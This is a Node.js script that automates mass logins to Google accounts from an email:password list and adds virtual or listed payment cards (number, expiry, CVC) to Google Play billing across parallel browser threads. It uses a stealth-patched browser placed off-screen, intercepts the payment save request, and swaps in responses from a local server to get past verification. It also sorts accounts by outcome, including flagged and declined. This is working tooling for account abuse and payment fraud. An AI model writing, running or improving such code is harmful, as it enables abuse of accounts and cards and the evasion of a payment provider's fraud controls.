import { chromium } from "patchright";
import fs from "fs/promises";
import axios from "axios";
import path from "path";
import readline from "readline";

const SELECT_BILLING_COUNTRY = true; 


let cards = [];
let runningThreads = 0;
let MAX_THREADS = 5;

const sleep = (ms) => new Promise(res => setTimeout(res, ms));

const COLORS = {
  reset: "\x1b[0m",
  black: "\x1b[30m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m",
  cyan: "\x1b[36m",
  white: "\x1b[37m",
  gray: "\x1b[90m",
  pink: "\x1b[38;5;13m",
};

class ConsoleLogger {
  constructor() {
    this.colors = COLORS;
  }

  timestamp() {
    return new Date().toLocaleTimeString("en-US", { hour12: false });
  }

  _formatMessage(level, color, message, fields = {}) {
    const ts = this.timestamp();
    let base = `${ts} ${color}${level}${COLORS.reset} ● ${message}`;

    const keys = Object.keys(fields);
    if (keys.length > 0) {
      let extra = ` ${COLORS.gray}→${COLORS.reset} `;
      const fieldStrs = keys.map(
        (key) => `${key}: [${color}${fields[key]}${COLORS.reset}]`
      );
      extra += fieldStrs.join(` ${COLORS.gray}|${COLORS.reset} `);
      base += extra;
    }

    return base;
  }

  success(message = "", fields = {}) {
    console.log(this._formatMessage("SUCCESS", COLORS.green, message, fields));
  }

  added(message = "", fields = {}) {
    console.log(this._formatMessage("CARD", COLORS.pink, message, fields));
  }

  error(message = "", fields = {}) {
    console.error(this._formatMessage("ERROR", COLORS.red, message, fields));
  }

  warning(message = "", fields = {}) {
    console.warn(this._formatMessage("WARNING", COLORS.yellow, message, fields));
  }

  info(message = "", fields = {}) {
    console.log(this._formatMessage("INFO", COLORS.blue, message, fields));
  }
}

const log = new ConsoleLogger();



function getCard() {
  return cards[Math.floor(Math.random() * cards.length)];
}

async function removeLineFromFile(filePath, lineToRemove) {
  try {
    const raw = await fs.readFile(filePath, "utf8");
    const updated = raw
      .split(/\r?\n/)
      .filter(l => l.trim() && l.trim() !== lineToRemove.trim())
      .join("\n");
    await fs.writeFile(filePath, updated + (updated.endsWith("\n") ? "" : "\n"), "utf8");
  } catch (e) {
    if (e.code !== "ENOENT") throw e;
  }
}

async function appendLine(filePath, line) {
  await fs.mkdir(path.dirname(filePath), { recursive: true });
  await fs.appendFile(filePath, line + "\n", "utf8");
}

const saveClickTimes = new Map();
const SAVE_CLICK_DELAY = 10000;

async function waitForSaveRateLimit(threadId) {
  const now = Date.now();
  const lastTime = saveClickTimes.get(threadId) || 0;
  const timeSinceLastSave = now - lastTime;

  if (timeSinceLastSave < SAVE_CLICK_DELAY) {
    const waitTime = SAVE_CLICK_DELAY - timeSinceLastSave;
    await sleep(waitTime);
  }

  saveClickTimes.set(threadId, Date.now());
}


async function tryClickCancelOrSkip(page) {
  const elementSelectors = [
    '[aria-label="Skip"]',
    '[aria-label="Not now"]',
    '[data-testid="skip"]',
    '[data-testid="cancel"]',
    '.skip-button',
    '.cancel-button',
    'button[jsname="ZUkOIc"]:not([disabled])',
    'button.VfPpkd-LgbsSe[data-idom-class*="ksBjEc"]:not([disabled])',
    'button[jsname="bySMBb"]',
    'button[data-idom-class*="yu6jOd"]',
    'button[data-idom-class*="lJTaZd"]',
  ];

  for (const selector of elementSelectors) {
    const elements = page.locator(selector);
    const count = await elements.count();

    for (let i = 0; i < count; i++) {
      const el = elements.nth(i);
      if (await el.isVisible()) {
        await el.click();
        await page.waitForTimeout(500);
        return await tryClickCancelOrSkip(page);
      }
    }
  }

  return false;
}


async function selectBillingCountry(cardFrame, page, countryCode = "PK") {
  try {
    const billingSection = cardFrame.locator('.b3-credit-card-billing-address-collapsing-form');
    await billingSection.waitFor({ state: 'visible', timeout: 8000 });
    await billingSection.scrollIntoViewIfNeeded();
    await billingSection.click({ force: true });
    await page.waitForTimeout(1000); 

    if (!SELECT_BILLING_COUNTRY) {
      console.log("[INFO] Billing section expanded (no country selection).");
      return;
    }

    await cardFrame.click('.countryselector-select');
    const menuOptions = cardFrame.locator('.goog-menuitem-content');
    await menuOptions.first().waitFor({ state: 'visible', timeout: 8000 });

    const optionByFlag = cardFrame.locator(`.goog-menuitem-content:has(.countryselector-flag-${countryCode})`);
    if (await optionByFlag.count() > 0) {
      await optionByFlag.first().scrollIntoViewIfNeeded();
      await optionByFlag.first().click({ force: true });
    } else {
      throw new Error(`Country code ${countryCode} not found in dropdown`);
    }

    await page.waitForTimeout(1000);
  } catch (error) {
    throw new Error(`[FATAL] Billing step failed (${SELECT_BILLING_COUNTRY ? "with selection" : "expand only"}): ${error.message}`);
  }
}


async function main(emailData) {
  const threadId = Math.random().toString(36).substr(2, 9);
  const browser = await chromium.launch({ headless: false, executablePath: "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe", args: ["--window-position=-2000,0", "--window-size=800,600" ], });
  const context = await browser.newContext({
    locale: "en-US",
  });
  const page = await context.newPage();
  const last4s = cards.map(c => c.split(":")[0].slice(-4));
  let processed = null;
  let email, password, subemail;

  try {
    const data = emailData.split(":");
    if (data.length === 2) {
      [email, password] = data
    } else {
      [email, password, subemail] = data
    }

    await page.route("**/*", async (route, request) => {
      const url = request.url();
      const method = request.method();
      const req_headers = request.headers();
      let postData = null;
      if (method === "POST") {
        postData = request.postData();
      }

      if (url.includes("https://payments.google.com/efe/payments/u/0/instrument_manager_save_page")) {
        const response = await axios.post(
          "http://127.0.0.1:3005/register-email-request",
          {
            data: postData,
            url,
            method,
            headers: req_headers
          },
          {
            headers: { "Content-Type": "application/json" }
          }
        );
        route.fulfill({
          status: response.data.status,
          contentType: "application/json",
          body: JSON.stringify(response.data.req_data),
          headers: response.data.headers
        });
        processed = true;
      } else {
        await route.continue();
      }
    });

    await page.goto("https://play.google.com/store/paymentmethods?pli=1", { waitUntil: "load" });

    await page.locator("input[type='email']").fill(email);
    await page.locator("#identifierNext button").click();
    await page.waitForLoadState("load");

    await page.waitForTimeout(3000);
    try {
      await page.locator('input[name="Passwd"]').fill(password, { timeout: 10000 });
      await page.locator("#passwordNext button").click();
      await page.waitForLoadState("load");
    } catch (err) {
      await browser.close()
      log.error(`Failed to login to email account`, { email: email, error: "Account flagged/Password is wrong" });
      return "FLAGGED";
    }

    await page.waitForTimeout(3000);
    const confirm_email = page.locator(".VV3oRb.YZVTmd.SmR8", {hasText: "Confirm your recovery email"});

    if (await confirm_email.count({ timeout: 5000 }) === 1) {
      await confirm_email.click();
      await page.locator("input[type='email']").fill(subemail);
      const next = page.locator(".VfPpkd-vQzf8d", {hasText: "Next"})
      while (await next.count() === 0) {
        await page.waitForTimeout(500);
        if (await next.count() === 1) {
          break;
        }
      }
      await next.click();
      await page.waitForLoadState("load");
    }

    log.success(`Successfully logged into gmail account`, { email: email });

    await page.waitForTimeout(4000);
    await tryClickCancelOrSkip(page);

    const cardDetails = getCard();
    const [card, month, year, cvc] = cardDetails.split(":");
    await page.waitForLoadState("load");
  
    await page.waitForTimeout(1000);


    try {
      const cardElement = page.getByText(/Visa|Mastercard/i);
      if (await cardElement.isVisible({ timeout: 3000 })) {
        const text = await cardElement.innerText();
        if (/^(Visa|Mastercard)/i.test(text)) {
          await browser.close();
          log.error(`Gmail account already has a vcc added`, { email: email });
          return "ALREADY";
        }
      }
    } catch (e) {
      log.warn("Error while checking existing VCC", { email: email, error: e });
    }
    await page.waitForTimeout(3000);

    const selectors = [
      'button[jsname="vvcstb"]',      
      'li.IFOh3c button',         
      'ul li button',
      '.HgYqic',
      '.wtAAs.FJcfob'                   
    ];

    let clicked = false;
    for (const sel of selectors) {
      try {
        const btn = page.locator(sel);
        await btn.waitFor({ state: 'visible', timeout: 16000 });
        await btn.click();
        clicked = true;
        break;
      } catch {}
    }

    if (!clicked) {
      await page.screenshot({ path: `Debugs/debug-add-card-failed.png` });
      throw new Error("Can't find 'Add Card' button, check debugging folder for more information");
    }

    await page.waitForLoadState("load");
    await page.waitForTimeout(2000);

    let cardFrame = null;
    const frameWaitStart = Date.now();

    while (!cardFrame && (Date.now() - frameWaitStart) < 15000) {
      for (const frame of page.frames()) {
        const url = frame.url();
        if (
          url.includes("payments.google.com") &&
          (url.includes("instrument_manager") || url.includes("instrument"))
        ) {
          cardFrame = frame;
          break;
        }
      }
      if (!cardFrame) {
        await page.waitForTimeout(500);
      }
    }

    if (!cardFrame) {
      await page.screenshot({ path: `Debugs/debug-no-frame-${email.split('@')[0]}.png` });
      throw new Error("Payment iframe not found after 15s — may be region-blocked or UI changed");
    }

    const cardNumberSelectors = [
      'input[name="cardnumber"]',
      'input[name="card-number"]',
      'input[id*="card"]',
      'input[placeholder*="card"]',
      '.b3-card-number-input-field'
    ];

    let cardNumberField = null;
    for (const selector of cardNumberSelectors) {
      try {
        await cardFrame.waitForSelector(selector, { timeout: 3000 });
        cardNumberField = cardFrame.locator(selector);
        break;
      } catch (e) {
        continue;
      }
    }

    if (!cardNumberField) {
      throw new Error("❌ Could not find card number field");
    }

    await selectBillingCountry(cardFrame, page);


    await page.waitForTimeout(2000);

    await cardNumberField.click({ timeout: 3000 });
    await cardNumberField.fill(card);
    await page.waitForTimeout(300);

    try {
      const monthField = cardFrame.locator('.b3-card-month-input-field');
      await monthField.waitFor({ state: 'attached', timeout: 3000 });
      await monthField.scrollIntoViewIfNeeded();
      await monthField.click({ force: true });
      await monthField.fill(month);
      await page.waitForTimeout(300);

      const yearField = cardFrame.locator('.b3-card-year-input-field');
      await yearField.waitFor({ state: 'attached', timeout: 3000 });
      await yearField.scrollIntoViewIfNeeded();
      await yearField.click({ force: true });
      await yearField.fill(year);
      await page.waitForTimeout(300);

      const cvcField = cardFrame.locator('.b3-security-code-input-field');
      await cvcField.waitFor({ state: 'attached', timeout: 3000 });
      await cvcField.scrollIntoViewIfNeeded();
      await cvcField.click({ force: true });
      await cvcField.fill(cvc);
      await page.waitForTimeout(300);

    } catch (e) {
      throw new Error("❌ Could not fill expiration date or CVC fields");
    }

    try {
      const billingSection = cardFrame.locator(
        '.b3-credit-card-billing-address-collapsing-form'
      );
      await billingSection.waitFor({ state: 'visible', timeout: 5000 });
      await billingSection.click({ force: true });
    } catch (e) {
      throw new Error("❌ Could not open Billing Address section");
    }

    await page.waitForTimeout(2000);
    await page.waitForTimeout(1000);

    await waitForSaveRateLimit(threadId);
    try {
      const saveBtn = cardFrame.locator('.submit-button.b3-primary-button');
      await saveBtn.waitFor({ state: 'visible', timeout: 5000 });
      await saveBtn.click({ force: true });
    } catch (e) {
      throw new Error("❌ Could not find or click Save button via class selector");
    }

    const startTime = Date.now();
    while (processed === null && (Date.now() - startTime) < 30000) {
      await page.waitForTimeout(500);
    }

    await page.waitForTimeout(2000);

    const pageContent = await page.content();
    if (pageContent.includes("OR-CCSEH-21")) {
      log.error(`Failed to add card into gmail account`, { email: email, error: "Your request failed. Use a different payment method" });
      await browser.close();
      return "ERRORADD"
    }

    try {
      const cardElement = page.getByText(/Visa|Mastercard/i);
      if (await cardElement.isVisible({ timeout: 3000 })) {
        const text = await cardElement.innerText();
        if (last4s.some(d =>
          text === `Visa-${d}` ||
          text === `Mastercard-${d}`
        )) {
          await browser.close();
          log.added(`Successfully added card into gmail account`, { email: email });
          return "DONE";
        }
      }
    } catch (e) {}

    await browser.close();
    log.error(`Failed to add card into gmail account`, { email: email });

    return false;

  } catch (e) {
    log.error(`Failed to process gmail account`, { email: emailData, error: e.message});

    await browser.close();
    return null;
  }
}
export async function processItem(item) {
  while (runningThreads >= MAX_THREADS) {
    await sleep(100);
  }

  runningThreads++;

  try {
    const result = await main(item);
    const data = item.split(":");
    if (data.length === 3) {
      [email, password, subemail] = data;
      item = `${email}:${password}`
    }
    if (result === "DONE") {
      await appendLine("Output/added_vcc.txt", item);
    } else if (result === "ERRORADD") {
      await appendLine("Output/card_declined.txt", item);
    } else if (result === "FLAGGED") {
      await appendLine("Output/account_flagged.txt", item);
    } else if (result === "ALREADY") {
      await appendLine("Output/already_added.txt", item);
    }  else {
      await appendLine("Output/failed_to_add_vcc.txt", item);
    }
  } finally {
    await removeLineFromFile("Input/emails.txt", item);
    runningThreads--;
  }
}

export async function batchRunner(items) {
  const promises = [];
  for (let i = 0; i < items.length; i++) {
    promises.push(processItem(items[i]));
  }
  await Promise.all(promises);
}

async function askQuestion(query) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise(resolve => rl.question(query, ans => {
    rl.close();
    resolve(ans);
  }));
}

async function run() {
  const rawEmails = await fs.readFile("Input/emails.txt", "utf8").catch(() => "");
  const emails = rawEmails.split(/\r?\n/).map(s => s.trim()).filter(Boolean);

  const rawCards = await fs.readFile("Input/cards.txt", "utf8").catch(() => "");
  cards = rawCards.split(/\r?\n/).map(s => s.trim()).filter(Boolean);

  console.log(`\n📧 Found ${COLORS.green}${emails.length}${COLORS.reset} emails`);
  console.log(`💳 Found ${COLORS.green}${cards.length}${COLORS.reset} cards`);

  const ans = await askQuestion(`⚙️  How many threads do you want to run? (default ${MAX_THREADS}): `);
  MAX_THREADS = parseInt(ans) > 0 ? parseInt(ans) : MAX_THREADS;
  console.log(`\n🚀 Running with ${COLORS.yellow}${MAX_THREADS}${COLORS.reset} threads...\n`);

  await batchRunner(emails);
}


run().catch(err => {
  log.error(`Batch run failed: ${err.message}`);
  process.exit(1);
});
